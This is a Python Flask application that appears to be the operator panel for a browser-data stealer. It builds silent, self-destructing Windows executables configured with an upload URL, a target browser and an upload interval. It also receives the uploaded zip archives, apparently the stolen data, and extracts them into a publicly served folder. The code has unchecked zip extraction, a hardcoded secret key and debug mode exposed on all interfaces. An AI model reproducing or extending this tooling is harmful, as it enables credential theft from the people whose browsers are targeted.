from flask import Flask, render_template, request, send_from_directory, flash, redirect, url_for
import os
import zipfile
import shutil
from builder import build_executable
import re


app = Flask(__name__)
app.secret_key = "supersecretkey"

# Directories
UPLOAD_FOLDER = "uploads"
UNZIPPED_FOLDER = "unzipped"
STATIC_FOLDER = "static"
BUILD_FOLDER = os.path.join(STATIC_FOLDER, "builds")

# Ensure directories exist
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(UNZIPPED_FOLDER, exist_ok=True)
os.makedirs(STATIC_FOLDER, exist_ok=True)
os.makedirs(BUILD_FOLDER, exist_ok=True)

@app.route("/")
def index():
    return redirect(url_for("uploads"))

@app.route("/uploads")
def uploads():
    zip_files = [f for f in os.listdir(UPLOAD_FOLDER) if f.endswith(".zip")]
    unzipped_files = []
    for root, _, files in os.walk(UNZIPPED_FOLDER):
        for file in files:
            rel_path = os.path.relpath(os.path.join(root, file), UNZIPPED_FOLDER)
            unzipped_files.append(rel_path)
    
    return render_template("uploads.html", zip_files=zip_files, unzipped_files=unzipped_files)

@app.route("/file_upload", methods=["POST"])
def file_upload():
    if "file" not in request.files or "metadata" not in request.form:
        return {"error": "Missing file or JSON payload"}, 400

    file = request.files["file"]
    json_data = request.form["metadata"]

    if file.filename == "":
        return {"error": "No file selected"}, 400

    if file and file.filename.endswith(".zip"):
        zip_path = os.path.join(UPLOAD_FOLDER, file.filename)
        file.save(zip_path)

        unzip_path = os.path.join(UNZIPPED_FOLDER, os.path.splitext(file.filename)[0])
        os.makedirs(unzip_path, exist_ok=True)
        with zipfile.ZipFile(zip_path, "r") as zip_ref:
            zip_ref.extractall(unzip_path)

        for root, _, files in os.walk(unzip_path):
            for f in files:
                src = os.path.join(root, f)
                dst = os.path.join(STATIC_FOLDER, os.path.relpath(src, unzip_path))
                os.makedirs(os.path.dirname(dst), exist_ok=True)
                shutil.copy2(src, dst)

        return {"status": "success", "json_received": json_data}, 200

    return {"error": "Invalid file type"}, 400

@app.route("/files/<path:filename>")
def serve_file(filename):
    return send_from_directory(STATIC_FOLDER, filename)

@app.route("/builder", methods=["GET", "POST"])
def builder():
    exe_files = [f for f in os.listdir(BUILD_FOLDER) if f.endswith(".exe")]
    
    if request.method == "POST":
        exe_name = request.form.get("exe_name")
        upload_url = request.form.get("upload_url")
        target_browser = int(request.form.get("target_browser"))
        upload_interval = int(request.form.get("upload_interval"))
        self_destruct = "self_destruct" in request.form
        silent = "silent" in request.form

        if not exe_name.endswith(".exe") or not re.match(r'^[a-zA-Z0-9_-]+\.exe$', exe_name):
            flash("Executable name must end with .exe and contain only letters, numbers, underscores, or hyphens", "error")
            return redirect(url_for("builder"))

        success, result = build_executable(
            exe_name=exe_name,
            upload_url=upload_url,
            target_browser=target_browser,
            upload_interval=upload_interval,
            self_destruct=self_destruct,
            silent=silent,
            output_dir=BUILD_FOLDER
        )

        if success:
            flash("Executable built successfully! Download it from the table below.", "success")
            return redirect(url_for("builder"))
        else:
            flash(f"Build failed: {result}", "error")
            return redirect(url_for("builder"))

    return render_template("builder.html", exe_files=exe_files)



if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
